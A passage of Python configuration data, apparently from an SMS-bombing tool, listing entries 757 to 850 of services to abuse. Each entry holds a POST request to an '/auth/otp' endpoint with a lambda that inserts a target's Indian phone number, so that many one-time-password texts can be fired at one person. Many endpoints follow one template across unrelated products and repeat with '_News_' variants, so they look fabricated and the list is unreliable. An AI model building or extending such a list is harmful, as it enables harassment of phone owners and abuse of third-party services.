    'name': 'Jira_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.jira.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 757
{
    'name': 'Confluence_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.confluence.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 758
{
    'name': 'Basecamp_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.basecamp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 759
{
    'name': 'Teamwork_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.teamwork.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 760
{
    'name': 'Wrike_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wrike.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 761
{
    'name': 'Podio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.podio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 762
{
    'name': 'Redmine_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.redmine.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 763
{
    'name': 'Taiga_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.taiga.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 764
{
    'name': 'MantisBT_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mantisbt.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 765
{
    'name': 'Bugzilla_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bugzilla.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 766
{
    'name': 'GitLab_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gitlab.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 767
{
    'name': 'GitHub_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.github.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 768
{
    'name': 'Bitbucket_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bitbucket.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 769
{
    'name': 'SourceForge_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sourceforge.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 770
{
    'name': 'Codeberg_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codeberg.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 771
{
    'name': 'Gitee_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gitee.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 772
{
    'name': 'GitKraken_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gitkraken.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 773
{
    'name': 'Sourcetree_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sourcetree.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 774
{
    'name': 'Fork_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fork.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 775
{
    'name': 'Tower_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tower.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 776
{
    'name': 'GitExtensions_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gitextensions.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 777
{
    'name': 'SmartGit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smartgit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 778
{
    'name': 'GitCola_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gitcola.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 779
{
    'name': 'GitAhead_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gitahead.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 780
{
    'name': 'GitFinder_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gitfinder.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 781
{
    'name': 'WorkingCopy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.workingcopy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 782
{
    'name': 'CodeHub_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codehub.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 783
{
    'name': 'Git2Go_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.git2go.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 784
{
    'name': 'Pocket_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pocket.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 785
{
    'name': 'Instapaper_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.instapaper.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 786
{
    'name': 'Readwise_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.readwise.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 787
{
    'name': 'Matter_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.matter.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 788
{
    'name': 'Feedly_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.feedly.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 789
{
    'name': 'Inoreader_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.inoreader.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 790
{
    'name': 'NewsBlur_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.newsblur.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 791
{
    'name': 'TheOldReader_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.theoldreader.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 792
{
    'name': 'NetNewsWire_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.netnewswire.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 793
{
    'name': 'Reeder_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.reeder.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 794
{
    'name': 'Fiery_Feeds_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fieryfeeds.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 795
{
    'name': 'Unread_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.unread.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 796
{
    'name': 'Lire_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lire.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 797
{
    'name': 'ReadKit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.readkit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 798
{
    'name': 'Vienna_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vienna.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 799
{
    'name': 'RSSOwl_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rssowl.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 800
{
    'name': 'QuiteRSS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.quiterss.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 801
{
    'name': 'Liferea_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.liferea.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 802
{
    'name': 'FeedReader_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.feedreader.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 803
{
    'name': 'RSSBandit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rssbandit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 804
{
    'name': 'RSSGuard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rssguard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 805
{
    'name': 'FluentReader_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fluentreader.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 806
{
    'name': 'GoodLinks_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.goodlinks.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 807
{
    'name': 'Curtail_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.curtail.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 808
{
    'name': 'Wallabag_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wallabag.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 809
{
    'name': 'Shiori_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.shiori.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 810
{
    'name': 'LinkAce_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.linkace.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 811
{
    'name': 'Raindrop_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.raindrop.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 812
{
    'name': 'BookmarkOS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bookmarkos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 813
{
    'name': 'StartMe_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.startme.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 814
{
    'name': 'Papaly_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.papaly.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 815
{
    'name': 'Booky_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.booky.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 816
{
    'name': 'Diigo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.diigo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 817
{
    'name': 'Delicious_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.delicious.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 818
{
    'name': 'Pinboard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pinboard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 819
{
    'name': 'ScoopIt_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.scoopit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 820
{
    'name': 'Paperli_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.paperli.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 821
{
    'name': 'Flipboard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.flipboard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 822
{
    'name': 'SmartNews_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smartnews.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 823
{
    'name': 'Google_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.google.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 824
{
    'name': 'Apple_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.apple.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 825
{
    'name': 'Yahoo_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.yahoo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 826
{
    'name': 'MSN_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.msn.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 827
{
    'name': 'AOL_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.aol.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 828
{
    'name': 'Reddit_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.reddit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 829
{
    'name': 'Twitter_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.twitter.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 830
{
    'name': 'Facebook_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.facebook.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 831
{
    'name': 'LinkedIn_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.linkedin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 832
{
    'name': 'Pocket_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.pocket.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 833
{
    'name': 'Instapaper_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.instapaper.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 834
{
    'name': 'Readwise_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.readwise.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 835
{
    'name': 'Matter_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.matter.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 836
{
    'name': 'Feedly_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.feedly.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 837
{
    'name': 'Inoreader_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.inoreader.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 838
{
    'name': 'NewsBlur_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.newsblur.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 839
{
    'name': 'TheOldReader_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.theoldreader.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 840
{
    'name': 'NetNewsWire_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.netnewswire.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 841
{
    'name': 'Reeder_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.reeder.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 842
{
    'name': 'Fiery_Feeds_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.fieryfeeds.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 843
{
    'name': 'Unread_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.unread.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 844
{
    'name': 'Lire_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.lire.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 845
{
    'name': 'ReadKit_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.readkit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 846
{
    'name': 'Vienna_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.vienna.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 847
{
    'name': 'RSSOwl_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.rssowl.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 848
{
    'name': 'QuiteRSS_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.quiterss.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 849
{
    'name': 'Liferea_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.liferea.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 850
{
    'name': 'FeedReader_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.feedreader.com/v1/auth/otp',
